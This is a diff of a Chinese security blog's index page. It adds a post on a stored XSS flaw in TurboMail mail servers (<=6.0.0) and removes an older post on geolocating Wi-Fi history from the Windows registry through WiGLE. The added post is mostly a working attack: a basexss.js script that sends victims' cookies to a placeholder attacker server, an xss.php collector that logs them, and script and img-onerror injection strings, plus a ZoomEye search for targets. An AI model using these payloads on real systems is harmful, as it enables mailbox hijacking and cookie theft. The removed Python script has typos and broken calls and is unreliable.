@@ -150,6 +150,104 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-TurboMail存储型XSS漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/25/TurboMail存储型XSS漏洞/">TurboMail存储型XSS漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/11/25/TurboMail存储型XSS漏洞/" class="archive-article-date">
+  	<time datetime="2018-11-25T07:35:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h2><p><code>app:&quot;TurboMail&quot;</code></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><strong>原因：</strong></p>
+<p><u>邮件内容编辑器对html标签未作转义</u></p>
+<p><u>1.草稿箱中的邮件内容未经转义直接json输出</u></p>
+<p><u>2.邮件内容读取模块未对html转义和过滤javascript函数</u></p>
+<p><strong>TurboMail</strong></p>
+<p>TurboMail邮件系统是面向企事业单位通讯需求而研发的电子邮件服务器系统，研发时间超过十年，作为国产完全自主开发的邮件系统中的佼佼者，客户群体十分广泛。</p>
+<p><strong>漏洞介绍</strong></p>
+<p>TurboMail邮件系统出现XSS存储型漏洞，攻击者可利用发邮件，通过受害者点击来执行JS脚本语句，触发XSS漏洞</p>
+<p><strong>影响范围</strong></p>
+<p>系统版本 &lt;=6.0.0</p>
+<p><strong>漏洞危害</strong></p>
+<p>攻击者通过发送邮件，诱使用户点击恶意邮件，攻击者可获得被害者当前账号Cookie，通过登录邮箱，甚至可能导致整个系统被攻击者恶意篡改，危害十分严重。</p>
+<h3 id="分析Payload"><a href="#分析Payload" class="headerlink" title="分析Payload"></a>分析Payload</h3><p>第一个为payload，当用户点击右键时，我们插入的的邮件内容会自动执行，去调用下面的JS语句。</p>
+<p>代码如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#basexss.js</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> (<span class="keyword">new</span> Image()).src=<span class="string">'http://攻击者服务器ip/xss.php?cookie='</span>+</span><br><span class="line"> <span class="built_in">escape</span>(</span><br><span class="line"> (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> [removed]</span><br><span class="line">      <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"> &#125;</span><br><span class="line"> &#125;)()</span><br><span class="line">)+<span class="string">'&amp;location'</span>+</span><br><span class="line"><span class="built_in">escape</span>(</span><br><span class="line"> (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [removed].href</span><br><span class="line">      &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"> &#125;)()</span><br><span class="line">);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<p>通过上述JS语句，我们向本地的xss.php发起了一次Get请求，将cookie传递给xss.php。</p>
+<p>第二个文件为xss.php，它可以接收Cookie信息，并输出到当前网页</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#xss.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cookie'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'location'</span>])) &#123;</span><br><span class="line">        $cookie =  $_REQUEST[<span class="string">'cookie'</span>];</span><br><span class="line">        $location =  $_REQUEST[<span class="string">'location'</span>];</span><br><span class="line">		$stri=<span class="string">"&lt;td&gt;"</span>.date(DATE_ATOM).<span class="string">"&lt;/td&gt;&lt;td&gt;Cookie:"</span>.$cookie.<span class="string">"&lt;/td&gt;&lt;td&gt;Location:"</span>.$location.<span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">		$fp = file_put_contents(<span class="string">'xss.txt'</span>, $stri.<span class="string">"\n"</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">$fp = file_get_contents(<span class="string">'xss.txt'</span>);</span><br><span class="line">$data = (explode(<span class="string">"\n"</span>,$fp));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;table boder=\"1\"&gt;"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($value == <span class="string">""</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.($key).<span class="string">"&lt;/td&gt;"</span>.$value.<span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/table&gt;"</span>;</span><br></pre></td></tr></table></figure>
+<p>它首先判断是否将Cookie传递过来，如果有传递，则正常接收，并将Cookie初始化为字符串，写入到同目录下的xss.txt里面，最后读取xss.txt，并将里面的字符串输出。</p>
+<p>将xss.php和basexss.js，放入<code>c:/phpstudy/WWW</code> 中。</p>
+<h3 id="payload-txt"><a href="#payload-txt" class="headerlink" title="payload.txt"></a>payload.txt</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">＜script src="http://攻击者服务器IP/basexss.js "＞＜/script＞</span><br><span class="line">或者</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span></span></span><br><span class="line"><span class="tag"><span class="attr">onerror</span>=<span class="string">s</span>=<span class="string">createElement(</span>'<span class="attr">script</span>');<span class="attr">body.appendChild</span>(<span class="attr">s</span>);<span class="attr">s.src</span>=<span class="string">'攻击者ip的js地址'</span>;&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当受害者查看邮件点击回复时，就会调用执行我们在本地的脚本basexss.js。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1.请求的url+sessionID</p>
+<p>2.<code>document.cookie=&quot;cookie&quot;</code></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/11/25/TurboMail存储型XSS漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Discuz全版本存储型DOM-XSS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1434,97 +1532,6 @@
 
 
   
-    <article id="post-通过windows注册表定位" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/12/通过windows注册表定位/">通过windows注册表定位</a>
-    </h1>
-  
-
-        
-        <a href="/2018/10/12/通过windows注册表定位/" class="archive-article-date">
-  	<time datetime="2018-10-12T05:42:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="通过windows注册表定位"><a href="#通过windows注册表定位" class="headerlink" title="通过windows注册表定位"></a>通过windows注册表定位</h2><h3 id="注册表中分析无线接入点"><a href="#注册表中分析无线接入点" class="headerlink" title="注册表中分析无线接入点"></a>注册表中分析无线接入点</h3><p>Windows 注册表包含了一个存储操作系统配置设置的层次化数据库。随着无线 网的出现，Windows 注册表存储了与无线连接相关的信息。</p>
-<p>从windows vista之后，注册表存储每一个网络信息在<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\Curren tVersion\NetworkList\Signatures\Unmanaged</code>子键值下。从命令提示符下，可以列出每一个网络显示描述GUID，网络描述，网络名称和网关MAC地址。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;reg query</span><br><span class="line"><span class="string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Signatures\Unmanaged"</span> /s</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Signatures\Unmanaged\010103000F0000F0080000000F0000F04BCC2360E4B8F7DC8BDAFAB8AE4DAD8</span><br><span class="line">62E3960B979A7AD52FA5F70188E103148</span><br><span class="line">ProfileGuid REG_SZ &#123;3B24CE70-AA79-4C9A B9CC83F90C2C9C0D&#125;</span><br><span class="line">Description REG_SZ Hooters_San_Pedro</span><br><span class="line">Source REG_DWORD 0x8</span><br><span class="line">DnsSuffix REG_SZ &lt;none&gt;</span><br><span class="line">FirstNetwork REG_SZ Public_Library</span><br><span class="line">DefaultGatewayMac REG_BINARY 00115024687F0000</span><br></pre></td></tr></table></figure>
-<h3 id="使用WinReg读取Windows注册表"><a href="#使用WinReg读取Windows注册表" class="headerlink" title="使用WinReg读取Windows注册表"></a>使用WinReg读取Windows注册表</h3><p>注册表存储的网关MAC地址作为REG_BINARY类型。16 进 制<code>\x00\x11\x50\x24\x68\x7F\x00\x00</code>表示的实际地址为 <code>00:11:50:24:68:7F</code>。 写一个快速的函数将 REG_BINARY 的值转换为实际的 MAC 地址。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">val2addr</span><span class="params">(val)</span>:</span></span><br><span class="line">    addr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> val:</span><br><span class="line">        addr += (<span class="string">"%02x"</span> % ord(ch))</span><br><span class="line">        addr = addr.strip(<span class="string">""</span>).replace(<span class="string">""</span>, <span class="string">":"</span>)[<span class="number">0</span>:<span class="number">17</span>]</span><br><span class="line">    <span class="keyword">return</span> addr</span><br></pre></td></tr></table></figure>
-<p>编写一个函数从windows注册表键值中获取每一个列出来的网络的网络名称和MAC地址，利用winreg模块，连接到注册表后，可以使用openkey()函数打开键，并循环获取键下面的网络描述。</p>
-<p>对于每一个描述，包含下面子键：<code>ProfileGuid, Description, Source, DnsSuffix, FirstNetwork, DefaultGatewayMac</code>网络名称和网关MAC地址在注册表键列表中的第四个和第五个。</p>
-<p>把所有的组合在一起，有一个脚本将打印存储在注册表中的先前连接的无线网络的信息。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># discoverNetworks.py</span></span><br><span class="line"><span class="comment"># coding = UTF-8</span></span><br><span class="line"><span class="keyword">import</span> _winreg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">val2addr</span><span class="params">(val)</span>:</span></span><br><span class="line">    addr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> val:</span><br><span class="line">        addr += (<span class="string">"%02x"</span> % ord(ch))</span><br><span class="line">        addr = addr.strip(<span class="string">""</span>).replace(<span class="string">""</span>, <span class="string">":"</span>)[<span class="number">0</span>:<span class="number">17</span>]</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printNets</span><span class="params">()</span>:</span></span><br><span class="line">    net = <span class="string">"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Signatures\Unmanaged"</span></span><br><span class="line">    key = _winreg.OpenKey(_winreg.HKEY_LOACL_MACHINE, net)</span><br><span class="line">    print(<span class="string">'\n[*]Networks You have Joined.'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            guid = _winreg.EnumKey(key, i)</span><br><span class="line">            netKey = _winreg.OpenKey(key, str(guid))</span><br><span class="line">            (n, addr, t) = _winreg.EnumValue(netKey, <span class="number">5</span>)</span><br><span class="line">            (n, name, t) = _winreg.EnumValue(netKey, <span class="number">4</span>)</span><br><span class="line">            macAddr = val2addr(addr)</span><br><span class="line">            netName = str(name)</span><br><span class="line">            print(<span class="string">'[+]'</span> + netName + <span class="string">' '</span> + macAddr)</span><br><span class="line">            _winreg.CloseKey(netKey)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    printNets()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>在使用管理员权限运行的脚本，可以看到先前连接过的无线网络及其MAC地址。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\investigator\Desktop\python discoverNetworks.py</span><br><span class="line">[*] Networks You have Joined.</span><br><span class="line">[+] Hooters_San_Pedro, 00:11:50:24:68:7F</span><br><span class="line">[+] LAX Airport, 00:30:65:03:e8:c6</span><br><span class="line">[+] Senate_public_wifi, 00:0b:85:23:23:3e</span><br></pre></td></tr></table></figure>
-<h3 id="使用Mechanize将MAC地址提交都Wigle"><a href="#使用Mechanize将MAC地址提交都Wigle" class="headerlink" title="使用Mechanize将MAC地址提交都Wigle"></a>使用Mechanize将MAC地址提交都Wigle</h3><p>WIGLE.net继续允许用户通过无线接入点的搜索物理位置，注册一个账号之后，用户就能通过一个小的python脚本和wigle.net进行交互。</p>
-<p>使用WiGLE.Net，用户很快就会意识到为了得到WiGLE必须与第三方的页面进行交互，首先必须打开WiGLE.net 的初始化页面在 <a href="https://wigle.net/网页；然后用户必须登陆到" target="_blank" rel="noopener">https://wigle.net/网页；然后用户必须登陆到</a> WiGLE 在 <a href="https://wigle.net/页面。" target="_blank" rel="noopener">https://wigle.net/页面。</a> 最后，用户可以查询特定的无线 SSID 的 MAC 地址在 <a href="https://wigle.net/页面。" target="_blank" rel="noopener">https://wigle.net/页面。</a> 捕获 MAC 地址查询请求，在请求无线接入点的 GPS 地址的 HTTP POST 请求中 tnetid(网络标识符)包含了 MAC 地址。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /gps/gps/main/confirmquery/ HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Content-Length: 33</span><br><span class="line">Host: wigle.net</span><br><span class="line">User-Agent: AppleWebKit/531.21.10</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">netid=0A%3A2C%3AEF%3A3D%3A25%3A1B</span><br><span class="line"><span class="tag">&lt;<span class="name">..SNIPPED..</span>&gt;</span></span><br><span class="line">//看到从页面响应的数据中包含了GPS坐标，字符串maplat=47.25264359&amp;maplon=-87.25624084 包含了接入点的经度和纬度。    </span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">class</span>=<span class="string">"search"</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/gps/gps/Map/onlinemap2/?maplat=47.25264359&amp;maplon=-87.25624084&amp;mapzoom=17&amp;ssid=McDonald's FREE</span></span></span><br><span class="line"><span class="tag"><span class="string">Wifi&amp;netid=0A:2C:EF:3D:</span></span></span><br><span class="line"><span class="tag"><span class="string">25:1B"</span>&gt;</span>Get Map<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>0A:2C:EF:3D:25:1B<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>McDonald's FREE Wifi<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;</span></span><br></pre></td></tr></table></figure>
-<p>建立一个简单的函数用来返回WiGLE数据库中记录的无线接入点的经度和纬度。使用mechanize模块，mechanize运行通过python进行web状态编程，类似与urllib模块的功能，一旦我们正常的登录到WiGLE服务，就会存储和重用我们的验证cookie</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># discoverNetworks.py</span></span><br><span class="line"><span class="comment"># coding = UTF-8</span></span><br><span class="line"><span class="keyword">import</span> _winreg</span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> mechanize</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">val2addr</span><span class="params">(val)</span>:</span></span><br><span class="line">    addr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> val:</span><br><span class="line">        addr += (<span class="string">"%02x"</span> % ord(ch))</span><br><span class="line">        addr = addr.strip(<span class="string">""</span>).replace(<span class="string">""</span>, <span class="string">":"</span>)[<span class="number">0</span>:<span class="number">17</span>]</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiglePrint</span><span class="params">(username, password, netid)</span>:</span></span><br><span class="line">    browser = mechanize.Browser()</span><br><span class="line">    browser.open(<span class="string">'http://wigle.net'</span>)</span><br><span class="line">    reqData = urllib.urlencode(&#123;<span class="string">'credential_0'</span>: username, <span class="string">'credential_1'</span>: password&#125;)</span><br><span class="line">    browser.open(<span class="string">'https://wigle.net/gps/gps/main/login'</span>, reqData)</span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    params[<span class="string">'netid'</span>] = netid</span><br><span class="line">    reqParams = urllib.urlencode(params)</span><br><span class="line">    respURL = <span class="string">'http://wigle.net/gps/gps/main/confirmquery/'</span></span><br><span class="line">    resp = browser.open(respURL, reqParams).read()</span><br><span class="line">    mapLat = <span class="string">'N/A'</span></span><br><span class="line">    mapLon = <span class="string">'N/A'</span></span><br><span class="line">    rLat = re.findall(<span class="string">r'maplat=.*\&amp;'</span>, resp)</span><br><span class="line">    <span class="keyword">if</span> rLat:</span><br><span class="line">        mapLat = rLat[<span class="number">0</span>].split(<span class="string">'&amp;'</span>)[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">    rLon = re.findall(<span class="string">r'maplon=.*\&amp;'</span>, resp)</span><br><span class="line">    <span class="keyword">if</span> rLon:</span><br><span class="line">        mapLon = rLon[<span class="number">0</span>].split</span><br><span class="line">    print(<span class="string">'[-]Lat:'</span> + mapLat + <span class="string">',Lon:'</span> + mapLon)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printNets</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    net = <span class="string">"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Signatures\Unmanaged"</span></span><br><span class="line">    key = _winreg.OpenKey(_winreg.HKEY_LOACL_MACHINE, net)</span><br><span class="line">    print(<span class="string">'\n[*]Networks You have Joined.'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            guid = _winreg.EnumKey(key, i)</span><br><span class="line">            netKey = _winreg.OpenKey(key, str(guid))</span><br><span class="line">            (n, addr, t) = _winreg.EnumValue(netKey, <span class="number">5</span>)</span><br><span class="line">            (n, name, t) = _winreg.EnumValue(netKey, <span class="number">4</span>)</span><br><span class="line">            macAddr = val2addr(addr)</span><br><span class="line">            netName = str(name)</span><br><span class="line">            print(<span class="string">'[+]'</span> + netName + <span class="string">' '</span> + macAddr)</span><br><span class="line">            wiglePrint(username, password, macAddr)</span><br><span class="line">            _winreg.CloseKey(netKey)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = optparse.OptionParser(<span class="string">"usage%prog -u &lt;wigle username&gt;- p &lt; wigle password &gt; "</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-u'</span>, dest=<span class="string">'username'</span>, type=<span class="string">'string'</span>, help=<span class="string">'specify wigle password'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-p'</span>, dest=<span class="string">'password'</span>, type=<span class="string">'string'</span>, help=<span class="string">'specify wigle username'</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    username = options.username</span><br><span class="line">    password = options.password</span><br><span class="line">    <span class="keyword">if</span> username == <span class="keyword">None</span> <span class="keyword">or</span> password == <span class="keyword">None</span>:</span><br><span class="line">        print(parser.usage)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        printNets()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>运行新脚本，可以看到先前连接过的无线网络和物理位置。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\investigator\Desktop\python discoverNetworks.py</span><br><span class="line">[*] Networks You have Joined.</span><br><span class="line">[+] Hooters_San_Pedro, 00:11:50:24:68:7F</span><br><span class="line">[-] Lat: 29.55995369, Lon: -98.48358154</span><br><span class="line">[+] LAX Airport, 00:30:65:03:e8:c6</span><br><span class="line">[-] Lat: 28.04605293, Lon: -82.60256195</span><br><span class="line">[+] Senate_public_wifi, 00:0b:85:23:23:3e</span><br><span class="line">[-] Lat: 44.95574570, Lon: -93.10277557</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/10/12/通过windows注册表定位/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
@@ -1636,15 +1643,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Web</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">Android</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1660,11 +1667,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color2">travel</a>
